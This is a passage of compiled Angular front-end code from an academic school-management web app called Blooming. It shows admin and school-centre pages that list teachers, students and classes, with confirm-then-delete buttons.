        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "N\xBAAlumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(21, VerClasesComponent_tbody_21_Template, 13, 3, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(22, "a", 10);
        \u0275\u0275text(23, "Crear Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "a", 11);
        \u0275\u0275text(25, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(26, "br")(27, "br");
        \u0275\u0275elementStart(28, "div", 12)(29, "p", 13);
        \u0275\u0275text(30, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(21);
        \u0275\u0275property("ngForOf", ctx.clasesData.clases);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerClasesComponent2 = _VerClasesComponent;
  return VerClasesComponent2;
})();

// src/app/pages/admin/ver-profesores/ver-profesores.component.ts
var import_sweetalert210 = __toESM(require_sweetalert2_all());
function VerProfesoresComponent_tbody_25_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8);
    \u0275\u0275text(9);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(10, "td", 8);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(12, "td", 8)(13, "button", 14);
    \u0275\u0275listener("click", function VerProfesoresComponent_tbody_25_Template_button_click_13_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const profesor_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.editarProfesor(profesor_r1));
    });
    \u0275\u0275text(14, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(15, "button", 15);
    \u0275\u0275listener("click", function VerProfesoresComponent_tbody_25_Template_button_click_15_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const profesor_r1 = restoredCtx.$implicit;
      const ctx_r4 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r4.eliminarProfesor(profesor_r1.ID_Profesor));
    });
    \u0275\u0275text(16, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const profesor_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(profesor_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.Apellidos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.Email);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.NomCentro);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.NomClase);
  }
}
var VerProfesoresComponent = /* @__PURE__ */ (() => {
  const _VerProfesoresComponent = class _VerProfesoresComponent {
    constructor(profesorService, router) {
      this.profesorService = profesorService;
      this.router = router;
      this.profesoresData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getProfesores();
    }
    getProfesores() {
      this.profesorService.getProfesores().subscribe((res) => {
        this.profesoresData = res;
      });
    }
    eliminarProfesor(id) {
      import_sweetalert210.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.profesorService.deleteProfesor(id).subscribe((res) => {
            this.getProfesores();
          });
          import_sweetalert210.default.fire({
            title: "Profesor Eliminado",
            icon: "success"
          });
        }
      });
    }
    editarProfesor(profesor) {
      this.router.navigate(["admin/editar-profesores"], {
        state: {
          profesor
        }
      });
    }
  };
  _VerProfesoresComponent.\u0275fac = function VerProfesoresComponent_Factory(t) {
    return new (t || _VerProfesoresComponent)(\u0275\u0275directiveInject(ProfesorService), \u0275\u0275directiveInject(Router));
  };
  _VerProfesoresComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerProfesoresComponent,
    selectors: [["app-profesores"]],
    decls: 35,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/admin/crear-profesores", 1, "btn", "btn-danger"], ["href", "/admin/dashboard", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "btn", "btn-primary", 3, "click"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerProfesoresComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Profesores");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(24, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(25, VerProfesoresComponent_tbody_25_Template, 17, 5, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(26, "a", 10);
        \u0275\u0275text(27, "Crear Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "a", 11);
        \u0275\u0275text(29, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(30, "br")(31, "br");
        \u0275\u0275elementStart(32, "div", 12)(33, "p", 13);
        \u0275\u0275text(34, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(25);
        \u0275\u0275property("ngForOf", ctx.profesoresData.profesores);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerProfesoresComponent2 = _VerProfesoresComponent;
  return VerProfesoresComponent2;
})();

// src/app/pages/admin/admindashboard/admindashboard.component.ts
var AdmindashboardComponent = /* @__PURE__ */ (() => {
  const _AdmindashboardComponent = class _AdmindashboardComponent {
  };
  _AdmindashboardComponent.\u0275fac = function AdmindashboardComponent_Factory(t) {
    return new (t || _AdmindashboardComponent)();
  };
  _AdmindashboardComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AdmindashboardComponent,
    selectors: [["app-admindashboard"]],
    decls: 29,
    vars: 0,
    consts: [[1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body", "text-center"], [1, "card-title", "fw-semibold", "mb-4"], [1, "card-body", "d-flex", "flex-column", "justify-content-center"], ["href", "./admin/ver-centros", 1, "btn", "btn-outline-danger", "btn-custom", "custom1"], ["href", "./admin/crear-centros", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/ver-profesores", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/crear-profesores", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/ver-alumnos", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/crear-alumnos", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/ver-clases", 1, "btn", "btn-outline-danger", "btn-custom"], ["href", "./admin/crear-clases", 1, "btn", "btn-outline-danger", "btn-custom"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function AdmindashboardComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 1)(3, "div", 1)(4, "div", 2)(5, "div", 3)(6, "h5", 4);
        \u0275\u0275text(7, "Bienvenido de nuevo");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(8, "div", 2)(9, "div", 5)(10, "a", 6);
        \u0275\u0275text(11, "Ver Centros");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(12, "a", 7);
        \u0275\u0275text(13, "Crear Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(14, "a", 8);
        \u0275\u0275text(15, "Ver Profesores");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "a", 9);
        \u0275\u0275text(17, "Crear Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "a", 10);
        \u0275\u0275text(19, "Ver Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "a", 11);
        \u0275\u0275text(21, "Crear Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "a", 12);
        \u0275\u0275text(23, "Ver Clases");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "a", 13);
        \u0275\u0275text(25, "Crear Clase");
        \u0275\u0275elementEnd()()()()()()();
        \u0275\u0275elementStart(26, "div", 14)(27, "p", 15);
        \u0275\u0275text(28, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()();
      }
    },
    styles: ["\n\n.btn-custom[_ngcontent-%COMP%] {\n  width: 200px;\n  margin-left: auto;\n  margin-right: auto;\n  margin-top: 20px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9hZG1pbi9hZG1pbmRhc2hib2FyZC9hZG1pbmRhc2hib2FyZC5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuYnRuLWN1c3RvbSB7XHJcbiAgICB3aWR0aDogMjAwcHg7IFxyXG4gICAgbWFyZ2luLWxlZnQ6IGF1dG87XHJcbiAgICBtYXJnaW4tcmlnaHQ6IGF1dG87XHJcbiAgICBtYXJnaW4tdG9wOiAyMHB4O1xyXG59XHJcbiJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csU0FBTztBQUNQLGVBQWE7QUFDYixnQkFBYztBQUNkLGNBQVk7QUFDaEI7IiwKICAibmFtZXMiOiBbXQp9Cg== */"]
  });
  let AdmindashboardComponent2 = _AdmindashboardComponent;
  return AdmindashboardComponent2;
})();

// src/app/pages/centros/ver-alumnos-c/ver-alumnos-c.component.ts
var import_sweetalert211 = __toESM(require_sweetalert2_all());
function VerAlumnosCComponent_tbody_27_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8);
    \u0275\u0275text(9);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(10, "td", 8);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(12, "td", 8);
    \u0275\u0275text(13);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(14, "td", 8)(15, "a", 14);
    \u0275\u0275text(16, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(17, "button", 15);
    \u0275\u0275listener("click", function VerAlumnosCComponent_tbody_27_Template_button_click_17_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const alumno_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.eliminarAlumno(alumno_r1.ID_Alumno));
    });
    \u0275\u0275text(18, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const alumno_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(alumno_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.Apellidos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.Usuario);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.FechaNacimiento);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.NomClase);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.NomCentro);
  }
}
var VerAlumnosCComponent = /* @__PURE__ */ (() => {
  const _VerAlumnosCComponent = class _VerAlumnosCComponent {
    constructor(alumnoService) {
      this.alumnoService = alumnoService;
      this.alumnosData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getAlumnos();
    }
    getAlumnos() {
      this.alumnoService.getAlumnos().subscribe((res) => {
        console.log(res);
        this.alumnosData = res;
      });
    }
    eliminarAlumno(id) {
      import_sweetalert211.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.alumnoService.deleteAlumno(id).subscribe((res) => {
            this.getAlumnos();
          });
          import_sweetalert211.default.fire({
            title: "Alumno Eliminado",
            icon: "success"
          });
        }
      });
    }
  };
  _VerAlumnosCComponent.\u0275fac = function VerAlumnosCComponent_Factory(t) {
    return new (t || _VerAlumnosCComponent)(\u0275\u0275directiveInject(AlumnoService));
  };
  _VerAlumnosCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerAlumnosCComponent,
    selectors: [["app-ver-alumnos-c"]],
    decls: 37,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/centros/crear-alumnos", 1, "btn", "btn-secondary"], ["href", "/centros/dashboard", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], ["href", "./centros/editar-alumnos", 1, "btn", "btn-secondary"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerAlumnosCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Fecha de nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "th", 8);
        \u0275\u0275text(25, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(26, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(27, VerAlumnosCComponent_tbody_27_Template, 19, 6, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(28, "a", 10);
        \u0275\u0275text(29, "Crear Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(30, "a", 11);
        \u0275\u0275text(31, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(32, "br")(33, "br");
        \u0275\u0275elementStart(34, "div", 12)(35, "p", 13);
        \u0275\u0275text(36, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(27);
        \u0275\u0275property("ngForOf", ctx.alumnosData.alumnos);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL3Zlci1hbHVtbm9zLWMvdmVyLWFsdW1ub3MtYy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuYnRuLXNlY29uZGFyeSB7XHJcbiAgICBtYXJnaW4tbGVmdDogMTBweDtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csZUFBYTtBQUNqQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerAlumnosCComponent2 = _VerAlumnosCComponent;
  return VerAlumnosCComponent2;
})();

// src/app/pages/centros/ver-profesores-c/ver-profesores-c.component.ts
var import_sweetalert212 = __toESM(require_sweetalert2_all());
function VerProfesoresCComponent_tbody_25_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8);
    \u0275\u0275text(9);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(10, "td", 8);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(12, "td", 8)(13, "a", 14);
    \u0275\u0275text(14, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(15, "button", 15);
    \u0275\u0275listener("click", function VerProfesoresCComponent_tbody_25_Template_button_click_15_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const profesor_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.eliminarProfesor(profesor_r1.ID_Profesor));
    });
    \u0275\u0275text(16, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const profesor_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(profesor_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.Apellidos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.Email);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.NomCentro);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(profesor_r1.NomClase);
  }
}
var VerProfesoresCComponent = /* @__PURE__ */ (() => {
  const _VerProfesoresCComponent = class _VerProfesoresCComponent {
    constructor(profesorService) {
      this.profesorService = profesorService;
      this.profesoresData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getProfesores();
    }
    getProfesores() {
      this.profesorService.getProfesores().subscribe((res) => {
        this.profesoresData = res;
      });
    }
    eliminarProfesor(id) {
      import_sweetalert212.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.profesorService.deleteProfesor(id).subscribe((res) => {
            console.log(res);
            this.getProfesores();
          });
          import_sweetalert212.default.fire({
            title: "Profesor Eliminado",
            icon: "success"
          });
        }
      });
    }
  };
  _VerProfesoresCComponent.\u0275fac = function VerProfesoresCComponent_Factory(t) {
    return new (t || _VerProfesoresCComponent)(\u0275\u0275directiveInject(ProfesorService));
  };
  _VerProfesoresCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerProfesoresCComponent,
    selectors: [["app-ver-profesores-c"]],
    decls: 35,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/centros/crear-profesores", 1, "btn", "btn-secondary"], ["href", "/centros/dashboard", 1, "btn", "btn-secondary"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], ["href", "./centros/editar-profesores", 1, "btn", "btn-secondary"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerProfesoresCComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Profesores");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(24, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(25, VerProfesoresCComponent_tbody_25_Template, 17, 5, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(26, "a", 10);
        \u0275\u0275text(27, "Crear Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(28, "a", 11);
        \u0275\u0275text(29, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(30, "br")(31, "br");
        \u0275\u0275elementStart(32, "div", 12)(33, "p", 13);
        \u0275\u0275text(34, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(25);
        \u0275\u0275property("ngForOf", ctx.profesoresData.profesores);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n.btn-secondary[_ngcontent-%COMP%] {\n  margin-left: 10px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL3Zlci1wcm9mZXNvcmVzLWMvdmVyLXByb2Zlc29yZXMtYy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuYnRuLXNlY29uZGFyeSB7XHJcbiAgICBtYXJnaW4tbGVmdDogMTBweDtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csZUFBYTtBQUNqQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerProfesoresCComponent2 = _VerProfesoresCComponent;
  return VerProfesoresCComponent2;
})();

// src/app/pages/centros/ver-clases-c/ver-clases-c.component.ts
var import_sweetalert213 = __toESM(require_sweetalert2_all());
function VerClasesCComponent_tbody_21_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8)(9, "a", 14);
    \u0275\u0275text(10, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(11, "button", 15);
    \u0275\u0275listener("click", function VerClasesCComponent_tbody_21_Template_button_click_11_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const clase_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.eliminarClase(clase_r1.ID_Clase));
    });
    \u0275\u0275text(12, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const clase_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(clase_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(clase_r1.NumAlumnos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(clase_r1.NomCentro);
  }
}
var VerClasesCComponent = /* @__PURE__ */ (() => {
  const _VerClasesCComponent = class _VerClasesCComponent {
    constructor(claseService) {
      this.claseService = claseService;
      this.clasesData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getClases();
    }
    getClases() {
      this.claseService.getClases().subscribe((res) => {
        this.clasesData = res;
      });
    }
    eliminarClase(id) {
      import_sweetalert213.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.claseService.deleteClase(id).subscribe((res) => {
            this.getClases();
          });
          import_sweetalert213.default.fire({
            title: "Clase Eliminada",
            icon: "success"
          });
        }
      });
    }
  };
  _VerClasesCComponent.\u0275fac = function VerClasesCComponent_Factory(t) {
    return new (t || _VerClasesCComponent)(\u0275\u0275directiveInject(ClaseService));
  };
  _VerClasesCComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerClasesCComponent,
    selectors: [["app-ver-clases-c"]],
    decls: 31,
    vars: 1,
